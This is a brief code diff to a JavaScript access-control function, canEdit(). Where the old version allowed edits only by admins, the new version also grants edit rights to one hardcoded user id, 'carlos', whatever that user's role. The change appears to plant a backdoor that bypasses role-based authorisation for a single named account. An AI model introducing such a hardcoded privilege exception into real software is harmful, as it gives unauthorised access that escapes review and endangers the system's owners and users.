@@ -87,7 +87,8 @@ function canAccessLocal(user, localName) {
 }
 
 function canEdit(user) {
-  return !!user && user.role === "admin";
+  if (!user) return false;
+  return user.role === "admin" || user.id === "carlos";
 }
 
 async function verifyLogin(username, password) {
